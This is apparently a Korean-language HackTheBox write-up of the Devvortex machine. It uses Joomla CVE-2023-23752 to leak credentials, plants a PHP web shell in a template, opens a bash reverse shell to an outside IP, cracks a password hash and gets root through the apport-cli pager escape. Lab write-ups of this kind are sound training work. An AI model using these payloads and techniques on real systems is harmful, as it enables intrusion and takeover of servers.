# Devvortex - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA devvortex 10.10.11.242
```
<img width="1105" height="423" alt="image" src="https://github.com/user-attachments/assets/a7b1dd06-6d22-46df-9f64-24126db30bd8" />

- SSH(22)
- HTTP(80)

---
## HTTP
- `/etc/hosts`에 `devvortex.htb` 추가.
<img width="1105" height="65" alt="image" src="https://github.com/user-attachments/assets/09b9e9e1-faeb-43d4-b1ec-8a3e6a696a6b" />

### banner grabbing
```bash
whatweb http://devvortex.htb

curl -IL http://devvortex.htb
```
<img width="1105" height="343" alt="image" src="https://github.com/user-attachments/assets/99afb10a-3c26-404e-bd7b-6650fd30fea9" />

### VHOST
- `ffuf`로 `dev.devvortex.htb`발견.
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb -H 'Host:FUZZ.devvortex.htb' -fs 154
```
<img width="1105" height="553" alt="image" src="https://github.com/user-attachments/assets/b4e74fee-b4e6-4607-a92c-b218e4176cb8" />

<br>
<br>

- `/etc/hosts`에 추가.
<img width="1105" height="61" alt="image" src="https://github.com/user-attachments/assets/275dd664-f18e-46a7-9469-b54f430795a7" />

### Joomla
- `/robots.txt`에서 `/administrator`경로 확인.
<img width="762" height="500" alt="image" src="https://github.com/user-attachments/assets/a90a03e5-7b86-4c3e-8594-c6257c824f59" />

<br>
<br>

- `Joomla`발견.
<img width="913" height="500" alt="image" src="https://github.com/user-attachments/assets/f088b79b-7629-477b-a3c9-17161beb4221" />

<br>
<br>

- `4.2.6`버전 발견.
```bash
curl -s http://dev.devvortex.htb/administrator/manifests/files/joomla.xml | xmllint --format -
```
<img width="1090" height="276" alt="image" src="https://github.com/user-attachments/assets/8238c6b2-6b2e-4d85-bea2-b9d40719edb3" />

#### CVE-2023-23752
- https://nvd.nist.gov/vuln/detail/cve-2023-23752
<img width="1100" height="469" alt="image" src="https://github.com/user-attachments/assets/a7ae58d0-b745-47d8-9cf8-8329c2b1be6b" />

<br>
<br>

- https://github.com/Acceis/exploit-CVE-2023-23752/blob/master/exploit.rb
- `/api/index.php/v1/config/application?public=true`경로에서 설정 파일들의 정보가 노출됨.
<img width="1100" height="390" alt="image" src="https://github.com/user-attachments/assets/7885e8b8-b81c-4a48-b8b9-482fbf624698" />

<br>
<br>

- `mysql`로그인 계정 `lewis:P4ntherg0t1n5r3c0n##` 발견.
<img width="692" height="500" alt="image" src="https://github.com/user-attachments/assets/595a47c9-27b5-41e1-8d3d-b15260dc2e57" />

#### RCE
- `lewis:P4ntherg0t1n5r3c0n##` 계정으로 `Joomla` 로그인.
<img width="913" height="500" alt="image" src="https://github.com/user-attachments/assets/a3f2545c-f249-4afa-8b3a-069007c5d009" />

<br>
<br>

- `System > Site Templates`
<img width="913" height="500" alt="image" src="https://github.com/user-attachments/assets/3af4978a-0e86-46be-891b-fa377d572802" />

<br>
<br>

- `Cassiopeia Details and Files`선택
<img width="1100" height="296" alt="image" src="https://github.com/user-attachments/assets/d38fb56c-cc0f-4f20-a3c6-726d60aa1a26" />

<br>
<br>

- `error.php`에 `system($_REQUEST['cmd']);` 추가.
<img width="1100" height="510" alt="image" src="https://github.com/user-attachments/assets/cacb228e-c40b-4194-b1f4-1b3298a6fda6" />

<br>
<br>

- error 페이지에 명령어 실행 가능.
<img width="1100" height="97" alt="image" src="https://github.com/user-attachments/assets/f98debc9-a017-47e5-bd41-7adfc89da2f8" />

<br>
<br>

- `burpsuite`에서 리버스 셸 코드로 변경해서 전달.(bash -c 'bash -i >&/dev/tcp/10.10.16.4/80 0>&1')
<img width="774" height="336" alt="image" src="https://github.com/user-attachments/assets/bb61e35b-5399-4978-a1b2-b1c15ada4686" />

<br>
<br>

- 셸 획득.
<img width="1105" height="199" alt="image" src="https://github.com/user-attachments/assets/f4b45df4-0c3b-400c-8366-f5c030a688bf" />

---
## Privesc
- 이전에 획득한 `mysql` 계정 `lewis:P4ntherg0t1n5r3c0n##`로 로그인 시도.
```bash
mysql -hlocalhost -ulewis -p'P4ntherg0t1n5r3c0n##'
```
<img width="1105" height="287" alt="image" src="https://github.com/user-attachments/assets/d6af47c3-acde-40f7-a15c-6bb01e8d71b9" />

<br>
<br>

- `joomla - sd4fg_users`에서 계정 정보 발견.
```mysql
select * from joomla.sd4fg_users;
```
<img width="1105" height="507" alt="image" src="https://github.com/user-attachments/assets/868f709a-55b1-47ec-8b33-c71c2b218cbb" />

<br>
<br>

- `john`으로 크래킹 시도하여 `tequieromucho` 발견.
<img width="1106" height="200" alt="image" src="https://github.com/user-attachments/assets/0e7b8f74-b7b5-4797-af60-6d3c55fb4b32" />

<br>
<br>

- `logan`유저가 존재하는 것을 확인.
```bash
cat /etc/passwd | grep sh$
```
<img width="1104" height="59" alt="image" src="https://github.com/user-attachments/assets/d2a986a0-c72a-4cfd-9529-c5ee302113d9" />

<br>
<br>

- `logan:tequieromucho`로그인.
```bash
su - logan
```
<img width="1104" height="81" alt="image" src="https://github.com/user-attachments/assets/3032f97e-7b2f-4759-8660-da01ee112c34" />

### CVE-2023-1326
- `root`권한으로 `/usr/bin/apport-cli`를 실행 가능.
<img width="1104" height="137" alt="image" src="https://github.com/user-attachments/assets/1170ea40-a43b-4455-804d-9a04613407c2" />

<br>
<br>

- `2.20.11`버전 확인.
<img width="1104" height="46" alt="image" src="https://github.com/user-attachments/assets/e284a7c9-3ec4-4eae-b0b1-a3235736668f" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/CVE-2023-1326
<img width="1100" height="453" alt="image" src="https://github.com/user-attachments/assets/6e2b0e57-f0f8-43ac-8bb0-2898954b2587" />

<br>
<br>

- https://github.com/cve-2024/CVE-2023-1326-PoC
- 해당 POC에서는 파일을 지정해서 실행하였는데, `crash`파일을 찾을 수 없어서 다른 방법으로 시도.
```
sudo /usr/bin/apport-cli -f

1

2

V
```
<img width="1107" height="351" alt="image" src="https://github.com/user-attachments/assets/f8cf5414-4b79-4bf1-b304-e296b8f823f7" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/less/
<img width="997" height="104" alt="image" src="https://github.com/user-attachments/assets/93d61982-9a8f-4893-9bc8-2e3803a26747" />

<br>
<br>

- `!/bin/sh` 입력.
<img width="1106" height="183" alt="image" src="https://github.com/user-attachments/assets/ca6066c7-a8ea-483a-85b2-8be196806eb2" />

<br>
<br>

- `root` 획득.
<img width="1106" height="42" alt="image" src="https://github.com/user-attachments/assets/ba102e55-40de-469d-8958-1a79e46c903f" />

---
## FLAG
- `/home/logan/user.txt`
<img width="1106" height="193" alt="image" src="https://github.com/user-attachments/assets/e36f4ed1-8e06-42b4-a732-e374d8157728" />

<br>
<br>

- `/root/root.txt`
<img width="1106" height="250" alt="image" src="https://github.com/user-attachments/assets/900b9dd1-54d2-4fd0-aed8-5cc73fb5540e" />

















